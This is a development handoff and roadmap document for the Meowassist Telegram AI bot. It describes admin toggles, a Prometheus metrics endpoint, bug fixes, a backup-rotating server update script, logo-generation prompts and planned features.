| **Stage-13-Step-D** | **Prometheus-style `/metrics` endpoint** for the IPN drop counters + reaper / alert / FX-loop heartbeats already accumulating in-memory. Mounted on the same aiohttp server, gated by an `IP_ALLOWLIST` env var (private-network observability only — no admin auth needed). Bug-fix candidate: the existing per-loop "last successful tick" timestamps are tracked in-process but never exposed; a stuck reaper / alert task is currently invisible until the dashboard tile diverges from reality. | P3 ops | pending |

### Stage-14 — admin toggles & multi-key OpenRouter (queued 2026-04-30)

| Step | Description | Priority | Status |
|------|-------------|----------|--------|
| **Stage-14-Step-A** | **AI model on/off toggle in admin web panel.** New `disabled_models` table (alembic 0015). `/admin/models` page lists every OpenRouter catalog model grouped by provider with enable/disable buttons. Disabled models are filtered from the Telegram picker (`_eligible_model`) and refused at chat time (`ai_engine.chat_with_model`). Audit-logged. In-memory cache (`admin_toggles.py`) avoids DB round-trips on the hot path. | P2 product | **shipped** |
| **Stage-14-Step-B** | **Payment gateway on/off toggle in admin web panel.** New `disabled_gateways` table (alembic 0015). `/admin/gateways` page lists TetraPay + all NowPayments currencies with enable/disable buttons. Disabled gateways are hidden from the currency picker and refused at invoice-creation time. Audit-logged. Same in-memory cache pattern. | P2 product | **shipped** |
| **Stage-14-Step-C** | **Multi-key OpenRouter load balancing.** Support `OPENROUTER_API_KEY_1..10` env vars. Sticky per-user assignment (`telegram_id % N`). Backward-compatible: if only the bare `OPENROUTER_API_KEY` exists, all traffic goes there. Module `openrouter_keys.py`. | P3 ops | **shipped** |

New files added in Stage-14:
- `admin_toggles.py` — in-memory cache for disabled models/gateways.
- `openrouter_keys.py` — multi-key pool with sticky per-user routing.
- `alembic/versions/0015_disabled_models_gateways.py` — migration for both tables.
- `templates/admin/models.html` — model toggle UI.
- `templates/admin/gateways.html` — gateway toggle UI.
- `tests/test_admin_toggles.py` — unit tests for toggle cache + handler helpers.
- `tests/test_openrouter_keys.py` — unit tests for multi-key routing.

### Stage-15 — Prometheus metrics, ops tooling, branding & future roadmap (queued 2026-04-30)

User direction (2026-04-30): *"finish all the things left… run a bug fix… create a folder called logos and posters… create prompts for logo using Nano Banana Pro… full guide on how to update server repo… suggest some steps for future of project in handoff."*

#### Stage-15-Step-A: Prometheus `/metrics` endpoint (carried from Stage-13-Step-D)

**Priority:** P3 ops
**Status:** ✅ shipped (this PR)

**What shipped:**
A new `metrics.py` module mounts `GET /metrics` on the existing aiohttp server alongside `/nowpayments-webhook`, `/tetrapay-webhook`, and the `/admin/` panel — same process, same port. Output is Prometheus text-exposition format (no third-party `prometheus_client` dependency; the format is rendered by hand in `metrics.render_metrics`). The endpoint is gated by `METRICS_IP_ALLOWLIST` (comma-separated IPs / CIDRs, default `127.0.0.1,::1` — localhost only). An empty allowlist locks every request out (fail-closed) so a typoed env var can't silently expose internal counters publicly. A v4 source IP against a v6-only allowlist (or vice versa) rejects cleanly rather than tripping a `TypeError`.

**Metrics exposed:**
1. `meowassist_ipn_drops_total{reason="bad_signature|bad_json|missing_payment_id|replay"}` — from `payments.get_ipn_drop_counters()`
2. `meowassist_tetrapay_drops_total{reason="bad_json|missing_authority|non_success_callback|unknown_invoice|verify_failed"}` — from `tetrapay.get_tetrapay_drop_counters()`
3. `meowassist_pending_reaper_last_run_epoch` — recorded on each successful `pending_expiration._expiration_loop` tick
4. `meowassist_fx_refresh_last_run_epoch` — recorded on each successful `fx_rates.refresh_usd_to_toman_loop` tick
5. `meowassist_model_discovery_last_run_epoch` — recorded on each successful `model_discovery.discover_new_models_loop` tick
6. `meowassist_catalog_refresh_last_run_epoch` — recorded inside `models_catalog._refresh` only when `_fetch_from_openrouter` actually succeeded (the warning-path that keeps the previous live snapshot deliberately leaves the gauge stale so operators can alert on it)
7. `meowassist_min_amount_refresh_last_run_epoch` — recorded on each successful `payments.refresh_min_amounts_loop` tick
8. `meowassist_pending_alert_last_run_epoch` — recorded on each successful `pending_alert._alert_loop` tick
9. `meowassist_chat_inflight_active` — gauge over `rate_limit.chat_inflight_count()` (new public read-only accessor)
10. `meowassist_disabled_models_count` — `len(admin_toggles.get_disabled_models())`
11. `meowassist_disabled_gateways_count` — `len(admin_toggles.get_disabled_gateways())`
12. `meowassist_openrouter_keys_count` — `openrouter_keys.key_count()`

A loop that has not yet ticked renders epoch `0` (Prometheus' typical `time() - last_run_epoch > N` alert expression treats `0` as "infinitely stale", which is exactly the desired semantic). Non-finite gauge values render as `0` (mirrors the wallet-display NaN defence elsewhere in the codebase) so `NaN` / `Inf` can never trip a Prometheus parser.

**Implementation:**
- `metrics.py` — `record_loop_tick`, `get_loop_last_tick`, `parse_ip_allowlist`, `is_ip_allowed`, `render_metrics`, `metrics_handler`, `install_metrics_route`. Loop heartbeats stored in a process-local `dict[str, float]` (no external state — a restart resets the counters, which is the same semantic the IPN drop counters already carry).
- `main.py` — calls `install_metrics_route(app)` immediately after the IPN routes register.
- `rate_limit.py` — new `chat_inflight_count()` accessor. Read is unsynchronised (a concurrent claim/release racing against the read shifts the count by ±1, fine for a metrics gauge — the next scrape settles).
- `payments.py`, `fx_rates.py`, `model_discovery.py`, `models_catalog.py`, `pending_alert.py`, `pending_expiration.py` — each forever-loop's success-path now calls `record_loop_tick(<loop>)` after the inner pass returns without raising.
- `.env.example` — new `METRICS_IP_ALLOWLIST` block (default `127.0.0.1,::1`, fail-closed on empty).

**Tests:** new `tests/test_metrics.py` (32 cases): allowlist parsing (well-formed, blank/malformed skip, mixed v4/v6), IP gating (empty == fail-closed, v4 + v6 loopback, outside-subnet, missing remote, unparseable remote, v4-vs-v6 cross-family), loop tick registry round-trip, render output shape (HELP/TYPE preamble, labelled counter format, sorted-by-label rendering, empty-counter still emits preamble, default epoch 0, integer-valued floats render cleanly, NaN/Inf coerce to 0), end-to-end aiohttp roundtrip via `aiohttp_client` (200 + `text/plain` from allowed IP, 403 from empty allowlist, 403 from outside-subnet allowlist), `install_metrics_route` stashes the parsed allowlist under the typed `APP_KEY_ALLOWLIST`. Total: 1344 (was 1320).

**Bug fix bundled (Stage-15-Step-D #1):** `handlers._active_pay_currencies` previously returned every NowPayments crypto ticker even when `NOWPAYMENTS_API_KEY` was unset / empty. A user picking BTC then hit a cryptic "Invalid API key" error from NowPayments on invoice creation, with no signal that the deploy hadn't been wired up — leading them to retry every other ticker until they exhausted the row. Post-fix the helper drops every NowPayments-routed ticker when the API key is absent, so the dual-currency entry / wallet hub falls back to showing only TetraPay (Rial) — the correct UX for a crypto-disabled deploy. Whitespace-only `NOWPAYMENTS_API_KEY=  ` values are treated identically (we `strip()` the env var) so an operator with a trailing-space typo doesn't accidentally re-enable the broken picker. New env-fresh check (no module-load caching) so a runtime `.env` edit followed by a restart picks the change up without a redeploy. Existing `test_active_pay_currencies_filters_disabled` updated to `monkeypatch.setenv("NOWPAYMENTS_API_KEY", "dummy-key-for-test")` so it stays scoped to the toggle-filter behaviour it was originally testing; a new `test_active_pay_currencies_empty_when_nowpayments_unset` covers the new env-gate path.

#### Stage-15-Step-B: Server update script with backup rotation

**Priority:** P3 ops
**Status:** ✅ shipped (PR #112)

**What:**
Create `scripts/update-server.sh` — a one-command script the admin runs on their VPS to:
1. Create a timestamped backup of the current running version
2. Pull the latest code from GitHub
3. Rebuild and restart Docker containers
4. Preserve `.env` (never overwrite)
5. Keep exactly 2 backups (current-1 and current-2); delete older ones

**Implementation plan:**
```bash
#!/usr/bin/env bash
# Usage: sudo bash scripts/update-server.sh
# Run from the project root (e.g. /opt/meowassist)
#
# What it does:
#   1. Stops the bot containers gracefully
#   2. Creates a backup of the current version at /opt/meowassist-backups/YYYY-MM-DD_HH-MM/
#      (copies everything EXCEPT .env, docker volumes, and __pycache__)
#   3. Pulls the latest code from origin/main
#   4. Rebuilds Docker images and restarts containers
#   5. Rotates backups: keeps the 2 most recent, deletes older ones
#
# Your .env is NEVER touched — it stays in place across updates.
# The database lives in a Docker volume — also untouched.
#
# Backup structure:
#   /opt/meowassist-backups/
#   ├── 2026-04-30_14-30/    ← most recent (before this update)
#   └── 2026-04-29_09-15/    ← previous
#   (older backups are automatically deleted)

set -euo pipefail

PROJECT_DIR="${PROJECT_DIR:-/opt/meowassist}"
BACKUP_ROOT="${BACKUP_ROOT:-/opt/meowassist-backups}"
KEEP_BACKUPS=2

TIMESTAMP=$(date +%F_%H-%M)
BACKUP_DIR="$BACKUP_ROOT/$TIMESTAMP"

echo "=== Meowassist update — $TIMESTAMP ==="

# 1. Back up current version
mkdir -p "$BACKUP_DIR"
rsync -a --exclude='.env' --exclude='__pycache__' --exclude='.git' \
    "$PROJECT_DIR/" "$BACKUP_DIR/"
echo "✓ Backup created: $BACKUP_DIR"

# 2. Rotate — keep only the N most recent
cd "$BACKUP_ROOT"
ls -dt */ | tail -n +$((KEEP_BACKUPS + 1)) | xargs -r rm -rf
echo "✓ Old backups rotated (keeping $KEEP_BACKUPS)"

# 3. Pull latest code
cd "$PROJECT_DIR"
git fetch origin main
git checkout main
git reset --hard origin/main
echo "✓ Code updated to $(git rev-parse --short HEAD)"

# 4. Rebuild & restart
docker compose up -d --build
echo "✓ Containers rebuilt and restarted"

# 5. Also restart Caddy if its compose file exists
if [ -f docker-compose.caddy.yml ]; then
    docker compose -f docker-compose.caddy.yml up -d
    echo "✓ Caddy restarted"
fi

echo ""
echo "=== Update complete ==="
echo "Run 'docker compose logs -f bot' to verify health."
```

**Key behaviors:**
- `.env` is excluded from the backup (it stays in place and is never overwritten by `git pull`)
- Docker volumes (Postgres data, Redis data) live outside the project dir — untouched
- The backup contains the full source tree (minus `.env`, `.git`, `__pycache__`) so you can manually restore by copying it back
- Exactly 2 backups are retained at all times (most recent + previous)
- `BACKUP_ROOT` and `PROJECT_DIR` are overridable via env vars for non-standard setups
- Alembic migrations run automatically on container start via `entrypoint.sh` — no manual migration step needed

**Admin cheat sheet (paste into SSH):**
```bash
cd /opt/meowassist && sudo bash scripts/update-server.sh
```

#### Stage-15-Step-C: Logos and posters folder with AI prompts

**Priority:** P2 product / branding
**Status:** ✅ shipped (PR #112)

**What:**
Create `logos_and_posters/` directory in the repo root containing prompt files for generating the Meowassist brand assets using **Nano Banana Pro** (or any image-generation AI).

**Prompts to create (each in its own `.md` file):**

1. **`logos_and_posters/logo-prompt.md`** — Primary logo prompt:
   ```
   Project context for AI image generator:
   Meowassist is a Persian/English Telegram AI assistant bot. It uses a cat (🐱)
   as its mascot. The bot proxies LLM requests (OpenRouter) and handles crypto
   payments. The brand identity is: friendly, techy, Persian-influenced, cat-themed.
   Domain: meowassist.space

   PROMPT — Primary Logo (square, 1024×1024):
   Minimal, modern logo mark of a stylized cat face merged with a circuit board
   or neural network pattern. The cat has one eye shaped like a chat bubble and
   the other like a glowing AI node. Color palette: deep purple (#6C3CE1) as
   primary, electric cyan (#00E5FF) as accent, on a clean white or transparent
   background. No text in the logo mark — just the icon. Flat design, no
   gradients, no shadows. Suitable for use as a Telegram bot avatar (circular
   crop friendly) and favicon.

   VARIATIONS:
   - Dark mode version (same icon, on #1A1A2E background)
   - Monochrome version (single color, for watermarks)
   ```

2. **`logos_and_posters/logo-text-prompt.md`** — Logo + wordmark prompt:
   ```
   PROMPT — Wordmark / Full Logo (horizontal, 2048×512):
   The cat-circuit icon from the primary logo on the left, followed by
   "Meowassist" in a clean sans-serif typeface (similar to Inter or SF Pro).
   The "Meow" part in deep purple (#6C3CE1), the "assist" part in electric
   cyan (#00E5FF). Subtle spacing between the icon and text. White/transparent
   background. Persian alternative: same layout but text is "میواسیست" in a
   modern Persian typeface (Vazirmatn or IRANSans style).
   ```

3. **`logos_and_posters/channel-banner-prompt.md`** — Telegram channel banner:
   ```
   PROMPT — Channel Banner (1280×640 for Telegram channel header):
   Wide banner with the Meowassist cat-circuit logo centered. Background is a
   subtle gradient from deep purple (#6C3CE1) to dark navy (#1A1A2E).
   Floating around the cat: tiny icons representing the bot's features —
   a wallet icon, a chat bubble, crypto coin symbols (₿ Ξ), a settings gear.
   Very subtle, almost like constellations. Bottom text: "meowassist.space"
   in small, elegant white text. Overall feel: premium, techy, trustworthy.
   ```

4. **`logos_and_posters/promotional-poster-prompt.md`** — Feature poster:
   ```
   PROMPT — Promotional Poster (1080×1920 for Instagram/Telegram stories):
   Top third: Meowassist cat logo glowing with cyan (#00E5FF) halo effect
   on dark purple background.
   Middle section: 4 feature cards arranged vertically:
     🤖 "Access to 100+ AI models" (in Persian: دسترسی به بیش از ۱۰۰ مدل هوش مصنوعی)
     💳 "Pay with crypto" (پرداخت با ارز دیجیتال)
     🇮🇷 "Rial payment via Shaparak" (پرداخت ریالی از طریق شاپرک)
     🆓 "Free messages to start" (پیام‌های رایگان برای شروع)
   Each card: frosted glass effect, rounded corners, small icon on left.
   Bottom: "@Meowassist_Ai_bot" with a "Start now" call-to-action button style.
   Colors: deep purple / cyan / white. Persian text should be primary,
   English subtitle underneath each line.
   ```

5. **`logos_and_posters/favicon-prompt.md`** — Favicon / app icon:
   ```
   PROMPT — Favicon / App Icon (512×512, will be scaled down to 32×32):
   The cat face from the primary logo, simplified to work at very small sizes.
   Only the essential shapes: cat ear silhouette + one glowing eye (cyan dot).
   Deep purple background, rounded square shape (iOS app icon style corners).
   Must be recognizable at 16×16 pixels — test by squinting.
   ```

6. **`logos_and_posters/README.md`** — Instructions for the admin:
   ```
   # Meowassist Brand Assets — AI Generation Prompts

   This folder contains prompts for generating Meowassist brand assets
   using AI image generators (Nano Banana Pro, Midjourney, DALL-E, etc.).

   ## Brand Identity
   - **Name:** Meowassist (میواسیست)
   - **Mascot:** Stylized cat with tech/AI elements
   - **Primary color:** Deep purple #6C3CE1
   - **Accent color:** Electric cyan #00E5FF
   - **Background dark:** Dark navy #1A1A2E
   - **Font suggestion:** Inter / SF Pro (English), Vazirmatn (Persian)
   - **Telegram handle:** @Meowassist_Ai_bot
   - **Domain:** meowassist.space

   ## Files
   | File | What it generates |
   |------|-------------------|
   | logo-prompt.md | Square icon/avatar (1024×1024) |
   | logo-text-prompt.md | Horizontal wordmark (2048×512) |
   | channel-banner-prompt.md | Telegram channel header (1280×640) |
   | promotional-poster-prompt.md | Story/poster (1080×1920) |
   | favicon-prompt.md | Tiny favicon (512×512) |

   ## How to use
   1. Open your AI image generator (Nano Banana Pro, etc.)
   2. Copy the PROMPT section from the relevant file
   3. Paste and generate
   4. Download the result and place it in this folder
   5. For the Telegram bot avatar: use the square logo, crop to circle

   ## Color reference
   | Swatch | Hex | Usage |
   |--------|-----|-------|
   | 🟣 | #6C3CE1 | Primary / brand purple |
   | 🔵 | #00E5FF | Accent / tech cyan |
   | ⚫ | #1A1A2E | Dark background |
   | ⚪ | #FFFFFF | Light background / text |
   ```

#### Stage-15-Step-D: Bug-fix pass

**Priority:** P1 correctness
**Status:** in progress (#1 shipped — bundled with Stage-15-Step-A)

**What:**
Systematic sweep of the codebase for latent bugs. Candidates identified during audit:

1. ~~**`_active_pay_currencies()` in handlers.py doesn't filter by whether NowPayments API key is actually configured.**~~ ✅ **shipped (Stage-15-Step-A bundle)** — `_active_pay_currencies` now also drops every NowPayments-routed ticker when `NOWPAYMENTS_API_KEY` is unset / whitespace-only, so the picker no longer surfaces options whose invoice-creation path would 401. Implementation reads the env var fresh on every call so a `.env` edit + restart picks it up without a code change. Tests: `tests/test_admin_toggles.py::test_active_pay_currencies_empty_when_nowpayments_unset` (new) + `test_active_pay_currencies_filters_disabled` (updated to monkeypatch `NOWPAYMENTS_API_KEY=dummy` so it stays scoped to the toggle-filter behaviour).

2. ~~**`openrouter_keys.py` `load_keys()` runs at module import time.**~~ ✅ **shipped (Stage-15-Step-D #2 PR)** — `load_keys()` is now triggered lazily by the first call to `key_for_user()` / `key_count()`, so an importer that doesn't need OpenRouter (a small DB-only script, a focused test suite) gets a silent import instead of a spurious "No OPENROUTER_API_KEY* env vars found." WARNING. The eager-at-import load also forced tests that `monkeypatch.setenv("OPENROUTER_API_KEY", ...)` to manually call `openrouter_keys.load_keys()` after the patch (because the cold-import snapshot already happened); the lazy contract makes that boilerplate unnecessary. A second access does NOT re-read env (the contract is "lazy *first* load") — explicit `load_keys()` remains the supported path for a hot reload. **Bundled bug fix:** Prometheus label-value escaping in `metrics._format_labelled_counter`. Per the [text-exposition spec](https://prometheus.io/docs/instrumenting/exposition_formats/) label values must escape `\` → `\\`, `"` → `\"` and `\n` → `\n`; the previous implementation skipped escaping with a comment claiming the only callers (`_IPN_DROP_COUNTERS`, `_TETRAPAY_DROP_COUNTERS`) emit ASCII-safe identifiers, which is true *today* but is one defensive check away from "any future caller passing a string poisons the entire scrape". A `"` in a label value would close the quoted region early and the line `meowassist_x{reason="bad"value"} 1` parses as malformed, blanking every metric in the response. New `_escape_label_value(value)` helper escapes the three required sequences in the right order (backslashes first, otherwise the quote-escape would be double-escaped); 2 new tests in `tests/test_metrics.py` (`test_format_labelled_counter_escapes_quotes_backslash_newlines`, `test_escape_label_value_unit`); 5 new tests in `tests/test_openrouter_keys.py` exercising the lazy-load contract. Total: 1358 (was 1351).

3. ~~**Race condition in `admin_toggles.py` refresh.** `refresh_disabled_models(db)` replaces `_disabled_models` with a new set from DB. Between the DB query and the set assignment, a concurrent `is_model_disabled()` call reads stale data. In practice harmless (single-process, async not threaded) but a future `uvloop` + thread pool change could surface it. Fix: document the single-process assumption or use `asyncio.Lock`.~~ ✅ **audited (Stage-15-Step-D #3 PR)** — added an extensive "Concurrency model" section to `admin_toggles.py`'s module docstring covering three potential race scenarios (admin toggle vs hot-path read, two admin tabs toggling simultaneously, future multi-process deploy) and explaining why none of them are real races under the current single-process / single-asyncio-loop deploy unit. The set-assignment in `refresh_disabled_*` is a single GIL-protected ref store; concurrent `is_model_disabled` calls see *either* the old set *or* the new set in full. The "race window" is sub-millisecond and bounded by event-loop tick latency, which is no worse than the equivalent two-replica DB transaction order. Multi-process deploy is documented as out-of-scope but called out as a future-Stage-E candidate (Redis pub-sub or periodic poll would close the cross-replica staleness gap). No code change beyond the docstring, since the design is correct as-is.

   **3-extension (✅ shipped — see Stage-15-Step-D #3-extension PR #114):** while inspecting #3 we found a *separate* real bug in the same file: `refresh_disabled_models` / `refresh_disabled_gateways` had no `try` / `except` around the DB read. A transient `asyncpg.ConnectionDoesNotExist` in the post-write resync path (the toggle DB write had already succeeded) propagated up to the aiohttp `_models_toggle_post` handler and returned a 500 to the admin even though the canonical row write was already durable. Worse, the in-memory cache stayed at the *pre-toggle* value, so `is_model_disabled` kept returning the stale answer until the next successful refresh — confusing the admin into clicking the toggle a second time and re-issuing the (now idempotent-but-noisy) DB write. Fix: mirror `load_disabled_*`'s fail-soft pattern with one important difference — preserve the previous cache instead of clearing it, because clearing on a transient blip would falsely re-enable every disabled model in the meantime, which is the opposite of fail-safe.

   **3-extension-2 (✅ shipped — see Stage-15-Step-D #3 PR):** complementary fix at the **write site**. PR #114 made the post-write *refresh* fail-soft, but the canonical *write* itself (`db.disable_model`, `db.enable_model`, `db.disable_gateway`, `db.enable_gateway`) was still bare-await. A transient DB error during the write would propagate up to a 500 response — exactly the same admin-confusing failure mode #114 fixed for the refresh side, just at one stage earlier in the handler. Now `_models_toggle_post` and `_gateways_toggle_post` wrap the write in `try`/`except`: on exception, the handler logs (`log.exception`), sets a flash error explaining the toggle didn't take effect, returns a clean 302 to the panel, and **skips** both the cache refresh and the audit row (since the operation didn't actually happen, the cache is already in sync with the DB and there's nothing to audit). 5 new tests in `tests/test_web_admin.py` covering the disable+enable failure paths for both models and gateways plus the unchanged happy path; 1 new test pinning the model-id-with-slash POST-body design (Stage-15-Step-D #4 audit).

4. ~~**`web_admin.py` model toggle routes use URL path `{model_id}` but model IDs contain `/` characters** (e.g. `openai/gpt-4o`). aiohttp path parameters don't match `/` by default. Verify the current implementation handles this correctly (likely uses a catch-all `{model_id:.+}` pattern or POST body). If not, fix the route.~~ ✅ **audited (Stage-15-Step-D #4 PR)** — confirmed the route reads `model_id` from the **POST form body** (`form.get("model_id")`) at `web_admin.py:_models_toggle_post`, NOT from a URL path parameter. The route URL is the static `/admin/models/disable` (no path-param matcher), so model IDs with embedded `/` characters round-trip cleanly through aiohttp. Same design for `gateways_toggle_post` (gateway keys don't currently have `/` but the form-body design is forward-compatible). Pinned with a new `test_models_disable_post_handles_model_id_with_slash` parametrised test that verifies `openai/gpt-4o`, `anthropic/claude-3-5-sonnet`, and `openrouter/auto` all POST cleanly without slash-truncation. Documented the design choice in the `_models_toggle_post` docstring so a future refactor that switches to URL-path parameters can't silently regress on slash-bearing IDs.

5. ~~**`tetrapay.py` IPN drop counters are process-local** — same pattern as `payments.py`. Both reset to zero on bot restart. The Prometheus `/metrics` endpoint (Step-A) will export them, but the admin dashboard at `/admin/` doesn't show them anywhere.~~ ✅ **shipped (Stage-15-Step-D #5 PR)** — new "IPN health" panel on `/admin/` lists every drop-counter reason for both NowPayments and TetraPay with current count, labelled "since last restart" so an operator understands the volatility. New `_collect_ipn_health()` helper in `web_admin.py` snapshots both gateways behind their own `try` so a future regression in one accessor cannot blank the other half. Each gateway's tile shows an "all zero" caveat when the totals are zero (so a fresh restart with no traffic doesn't *look* broken) and a "counters unavailable" fallback when the accessor itself raises (so a future bug in `payments.get_ipn_drop_counters` doesn't 500 the entire dashboard). For long-running history beyond a single process lifetime, scrape `/metrics` into Prometheus — the panel intentionally does not persist counters to DB. **Bundled bug fix:** parity gap between `admin.format_metrics` (Telegram-side `/admin_metrics`) and the web dashboard. Stage-12-Step-B added `pending_payments_over_threshold_count` + `pending_alert_threshold_hours` to `Database.get_system_metrics` and wired both into `dashboard.html` but missed `format_metrics`, so an operator on Telegram saw "5 pending" with no signal that 3 of those 5 were already past the proactive-DM threshold and were triggering separate alert DMs. The web operator saw both. Now `format_metrics` renders an `↳ {N} over {threshold}h` sub-line whenever the over-threshold count is non-zero, matching the dashboard's tile. The sub-line is suppressed on zero (terse digest) and skipped entirely if the keys are missing (backward compat with pre-Stage-12-B callers / a half-populated dict from an upgrade-in-flight). 3 new `format_metrics` tests in `tests/test_admin.py`; 3 new dashboard tests in `tests/test_web_admin.py` covering the populated tile, the all-zero message, and the resilient-to-accessor-failure path. Total: ~1364.

6. **`rate_limit._chat_inflight` was a `set[int]` but eviction expected FIFO order.** When `_CHAT_INFLIGHT_MAX` (10 000) is exceeded the eviction branch did `next(iter(_chat_inflight))`, which the comment described as "FIFO so the oldest stuck slot drops first" — but `set` iteration is hash-bucket-ordered, not insertion-ordered. For real Telegram ids (10-digit ints) the first-iter element is essentially arbitrary and frequently happens to be the *most recent* claim, i.e. an actively-in-flight user whose request has not finished. Pre-fix, a leak that filled the slot dict could evict the wrong users in a loop, simultaneously (a) leaving the truly stuck slots in place and (b) cancelling the in-flight requests of innocent active users. Fix: switch the container from `set[int]` to `dict[int, None]`. `dict` iteration is insertion-ordered (CPython 3.6 / Python 3.7 spec), so `next(iter(...))` returns the *actually* oldest slot. Same lock, same idempotent release semantics, same test surface — just a backing-store swap. Shipped Stage-15-Step-D #3-extension-2.

#### Stage-15-Step-E: Future project suggestions

**Priority:** info / planning
**Status:** pending — document only, no implementation

**Suggested roadmap for future development (post Stage-15):**

| # | Suggestion | Priority | Effort | Notes |
|---|-----------|----------|--------|-------|
| 1 | **Conversation history persistence & export** — let users download their chat history as `.txt` / `.pdf`. Currently conversations are in-memory buffer only (`conversation_messages` table). Add a `/history` command or wallet-menu button. | P2 product | Medium | Users on paid models want records of expensive conversations |
| 2 | **Spending analytics for users** — show users their own spending dashboard: total spent, per-model breakdown, daily/weekly graphs. Currently only admins see metrics. Add a `/stats` command or inline menu. | P2 product | Medium | Builds trust + reduces support questions about "where did my money go" |
| 3 | **Webhook mode instead of long-polling** — switch from aiogram long-polling to webhook mode. The aiohttp server already runs; register a `/telegram-webhook` route. Reduces latency, uses fewer resources. | P3 ops | Low | Only worthwhile if the bot gets >100 concurrent users |
| 4 | **Rate limiting per OpenRouter key** — extend `openrouter_keys.py` with per-key 429 detection. If a key gets rate-limited, temporarily redistribute its users to other keys. Current sticky assignment doesn't handle key exhaustion. | P3 ops | Medium | Only matters with 10+ keys and heavy traffic |
| 5 | **Admin role system** — currently all admins have full access. Add roles: `viewer` (read-only dashboard), `operator` (can broadcast, manage promos), `super` (can edit users, refund). Store in DB, not env. **STARTED — see "Stage-15-Step-E #5" section below for first-slice scope, what remains, and the bundled JSONB-decode bug fix.** | P2 product | High | Only needed if the team grows beyond 1 admin |
| 6 | **Automated testing with real Telegram** — use `telethon` or `pyrogram` to write integration tests that actually send messages to the bot and verify responses. Currently all tests are unit tests with mocked Telegram. **STARTED — see "Stage-15-Step-E #6" section below for the scaffold + skip-by-default gate + bundled `_parse_float_env` non-finite guard.** | P3 ops | High | Big investment but catches integration bugs CI can't |
| 7 | **i18n framework upgrade** — move from the current `strings.py` dict to proper `.po` / `.mo` gettext files. Enables community translations, pluralization rules, and tooling like Crowdin. **STARTED — see "Stage-15-Step-E #7" section below for the `.po` round-trip foundation + bundled nested-format-spec extraction bug fix.** | P2 product | Medium | Only worthwhile if adding a third language (Arabic, Turkish) |
| 8 | **Zarinpal payment gateway** — add a conventional card payment option for Iranian users (alternative to TetraPay). **STARTED — see "Stage-15-Step-E #8" section below for the Zarinpal v4 first-slice (create / verify / browser-redirect callback) + bundled `model_discovery` / `fx_rates` int-env import-time-crash + missing-floor bug fix.** **Stripe is OUT OF SCOPE** — the operator is in Iran and cannot complete Stripe's KYC, so an international card path through Stripe is not buildable for this deploy. If the operator's situation ever changes, the slot is free for a future stage to revisit. | P2 product | Medium | Significant gateway integration work |
| 9 | **Bot monetization dashboard** — admin page showing revenue vs. OpenRouter cost, profit margin per model, break-even analysis. All data already exists in `usage_logs` + `transactions`. **STARTED — see "Stage-15-Step-E #9" section below for the `/admin/monetization` first-slice (lifetime + 30-day revenue / charges / implied OpenRouter cost / gross margin / per-model breakdown) + bundled Zarinpal-drop-counters-not-exported fix that wires the existing `_ZARINPAL_DROP_COUNTERS` registry into both the Prometheus exposition and the admin dashboard's IPN-health tile.** | P2 product | Medium | High value for the operator to understand business health |
| 10 | **Image / vision model support** — let users send photos and have vision models (GPT-4V, Claude 3) analyze them. OpenRouter supports multimodal; need to handle Telegram photo downloads + base64 encoding in `ai_engine`. **STARTED, integrated end-to-end — see "Stage-15-Step-E #10" section below for both slices: (1) the `vision.py` foundation (pure helpers: `is_vision_capable_model`, `encode_image_data_uri`, `build_multimodal_user_message`) + bundled persistence-after-charge double-billing fix in `ai_engine.chat_with_model`; (2) the integration — new `process_photo` handler in `handlers.py`, `image_data_uris` keyword in `ai_engine.chat_with_model`, vision-capability gate, localised error strings — plus the bundled NUL-byte sanitisation root-cause fix in `database.append_conversation_message`. Memory persistence for image turns and the HEIC document path remain as quality-of-life follow-ups.** | P2 product | Medium | Popular user request for AI bots |
| 11 | **Voice message support** — accept Telegram voice messages, transcribe via Whisper (OpenRouter or direct API), send text to the LLM, optionally TTS the response back. | P2 product | High | Differentiator for Persian-speaking users who prefer voice |
| 12 | **Group chat mode** — let the bot operate in Telegram groups, responding to mentions or commands. Currently private-chat only. Needs mention parsing, per-group settings, spam prevention. | P2 product | High | Big surface area; defer until single-user mode is rock-solid |

---

##### Stage-15-Step-E #1 — what's shipped vs. what remains (STARTED, not finished)

User direction (2026-04-30): walk down the Step-E table and **start** every item one by one, marking each as STARTED in this doc so the next AI can continue the work. Each PR ships a meaningful first slice + a real bundled bug fix.

**Step-E #1 (Conversation history persistence & export) — STARTED in PR-after-#118.**

What's shipped this PR:

* `conversation_export.py` — new module with `format_history_as_text(rows, user_handle)` and `export_filename_for(telegram_id)`. Renders the persisted buffer as a plain-text export with role labels, ISO-8601 UTC timestamps, and a header. Defensive against naive `datetime` (forces UTC), unknown roles (capitalised fallback), and missing timestamps (`(unknown time)` placeholder). 1 MB hard cap with **oldest-first truncation** and a header note showing kept-vs-trimmed counts.
* `Database.get_full_conversation(telegram_id)` — new DB method, **separate** from `get_recent_messages`. Returns every row with `created_at`, ordered oldest-first, no `LIMIT`. Intentionally does NOT consult `memory_enabled` — the user owns the data even after they disable the feature.
* `handlers.memory_export_handler` (`mem_export` callback) wired up. Empty-buffer → toast alert instead of empty file. Persisted under both memory states (the button is always visible on the memory screen).
* New i18n strings (FA + EN): `btn_memory_export`, `memory_export_empty`, `memory_export_caption`, `memory_export_done`.
* 13 new tests in `tests/test_conversation_export.py` covering formatter, filename, handler happy path, empty buffer, missing username, button visibility on both memory states.

What remains (next AI's TODO):

* **`.pdf` export** — the original spec mentioned both `.txt` and `.pdf`. PDF needs `reportlab` or `weasyprint` added to `requirements.txt`. **Important for Persian users:** RTL rendering is a known PDF pain point — `reportlab` needs an Arabic shaping library (`python-bidi` + `arabic-reshaper`). Confirm with the operator which dependency surface is acceptable before adding.
* ✅ **`/history` command alias** — shipped in the Stage-15-Step-E #1 follow-up. `cmd_history` (`@router.message(Command("history"))`) re-uses the new `_build_history_export_document(user_id, username)` helper so the slash and the wallet-menu button can never drift on filename / encoding / trim semantics.
